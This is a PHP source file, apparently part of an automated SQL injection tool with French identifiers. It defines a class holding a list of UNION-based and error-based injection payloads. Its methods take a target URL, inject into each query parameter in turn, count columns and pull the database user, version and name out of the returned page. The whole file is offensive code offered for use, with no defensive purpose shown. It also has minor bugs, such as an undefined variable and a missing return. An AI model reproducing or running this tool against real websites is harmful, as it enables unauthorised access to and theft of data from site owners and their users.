<?php
class sqli_inject
{
	function __construct() {
		$this->hr = new Curl();
		$this->ch = new chaine();
	}
	private $_url_originale;
    private $_url_base;
    private $_nbr_colonne;
    private $_colonne_point;
    private $_param = Array();
    private $hr;
    private $ch;
    private $baseI = '(select 1 from(select count(*),concat((select (select [t]) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)';
    private $separateur = '!~!';
    private $s_separateur = '~!';
    private $_union = array(
        '999999.9 union all select [t]',
        '999999.9 union all select [t]--',
        '999999.9\' union all select [t] and \'0\'=\'0',
        '999999.9" union all select [t] and "0"="0',
        '999999.9) union all select [t] and (0=0',
        '9\' and [t] \'1\'=1',
        '9\' or 1=[t] and \'1\'=1',
        '999999.9 union all select [t] #',
        '999999.9 union all select [t]-- #',
        '999999.9" union all select [t] and "0"="0 #',
        '999999.9\' union all select [t] and \'0\'=\'0 #',
        '999999.9) union all select [t] and (0=0) #',
    );

	function uniqueAnalyse($url, $union)
    {
        $colonne = new sqli_colonne();
        $inj_point = '';
        $inj_point_curr = '';
        $_url_originale = $url;
        $_url_base = current(explode('?', $url));
        $this->_param = $this->ch->analyseParam($url);
		$r = array();
        $_nbr_colonne = $colonne->Compter($this->_param, $_url_base, $union);
        $r['nbr_colonne'] = $_nbr_colonne;

		$c_p = count($this->_param);
        for ($p = 0; $p <= $c_p; $p++) {
            $this->_colonne_point = $colonne->FindColonneVise(
				$_url_base .
        		$this->ch->escapeParam($this->ch->genParamParIndex($this->_param, 0, $p + 1)) .
        		str_replace('[t]', $this->ch->genNbrColonneVise($_nbr_colonne, $this->_colonne_point), $union) .
        		$this->ch->genParamParIndex($this->_param, $p + 1, count($this->_param)), $_nbr_colonne
			);

            $r['colonne_point'] = $this->_colonne_point;

            $inj_point = $_url_base . $this->ch->Encode($this->ch->escapeParam(
				$this->ch->genParamParIndex($this->_param, 0, $p + 1)) .
      			str_replace('[t]', $this->ch->genNbrColonneVise($_nbr_colonne, $this->_colonne_point), $union) .
        		$this->ch->genParamParIndex($this->_param, $p + 1, count($this->_param))
			);

            $inj_point_curr = str_replace(
				'[t]', $this->ch->Encode('concat(' .
        		$this->ch->getHex($this->separateur) . ',concat(user(),' .
      			$this->ch->getHex($this->s_separateur) . ',version(),' . $this->ch->getHex($this->s_separateur) .
      			',database()),' . $this->ch->getHex($this->separateur) . ')'), $inj_point
			);

            $page = $this->hr->get($inj_point_curr);

            if (strpos($page, $this->separateur) !== false || strpos($page, $this->s_separateur) !== false) {
								$r['injection_point'] = $inj_point;
                $r['data'] = 'Union used: ' . $union .'URL target builded find ==> "' . $inj_point . '""';
								$r['found'] = true;
                break;
            } else {
                $r['data'] = 'Union: ' . $union .' Injection Failed';
				$r['found'] = false;
            }
        }
		return $r;
    }

    function autoAnalyse($url)
    {
        $vrf = new sqli_check();
        $colonne = new sqli_colonne();
        $inj_point = '';
        $inj_point_curr = '';
        $point_trv = false;
        $_url_originale = $url;
        $_url_base = current(explode('?', $url));
        $this->_param = $this->ch->analyseParam($url);
		$r = array();
        $r['found'] = false;

        if ($vrf->demmareAnalyseFast($url) || $vrf->demmareAnalyseAvanced($url))
        {
            $u = 0; //Union Style 1
            while (!$r['found'] && $u < count($this->_union))
            {
                $_nbr_colonne = $colonne->Compter($this->_param, $_url_base, $this->_union[$u]);
                for ($p = 0; $p <= count($this->_param); $p++)
                {
                	//echo 'la ==><br>';
                    $this->_colonne_point = $colonne->FindColonneVise(
                        $_url_base .
                    	$this->ch->escapeParam($this->ch->genParamParIndex($this->_param, 0, $p + 1)) .
                    	str_replace('[t]', $this->ch->genNbrColonneVise($_nbr_colonne, $this->_colonne_point), $this->_union[$u]) .
                    	$this->ch->genParamParIndex($this->_param, $p + 1, count($this->_param)), $_nbr_colonne
                    );
                    echo 'Colonne Vise ==>'.$this->_colonne_point.'<br>';

                    $inj_point = $_url_base . $this->ch->Encode(
                        $this->ch->escapeParam($this->ch->genParamParIndex($this->_param, 0, $p + 1)) .
                    	str_replace('[t]', $this->ch->genNbrColonneVise($_nbr_colonne, $this->_colonne_point), $this->_union[$u]) .
                		$this->ch->genParamParIndex($this->_param, $p + 1, count($this->_param))
                    );
                    echo '==>'.$inj_point.'<br>';

                    $inj_point_curr = str_replace('[t]', $this->ch->Encode('concat(' .
                    		$this->ch->getHex($this->separateur) . ',concat(user(),' .
                			$this->ch->getHex($this->s_separateur) . ',version(),' . $this->ch->getHex($this->s_separateur) .
                			',database()),' . $this->ch->getHex($this->separateur) . ')'), $inj_point
                    );
                    echo '==>'.$inj_point_curr.'<br>';

                    $page = $this->hr->get($inj_point_curr);
                    if (strpos($page, $this->separateur) !== false || strpos($page, $this->s_separateur) !== false)
                    {
                        $r['page_analyse'] = $page;
                        $r['injection_point'] = $url_point;
                        $r['found'] = true;
                        $r['result_analyse'] = 'OK trouver ==> ' . $url_point;
                        break;
                    } else {
                        $r['result_analyse'] = 'injection echouer pas de resultat ! <br>';
                    }
                }
                $u++;
            }
        } else {
			$r['result_analyse'] = 'Injection echouer char';
        }
    }
}
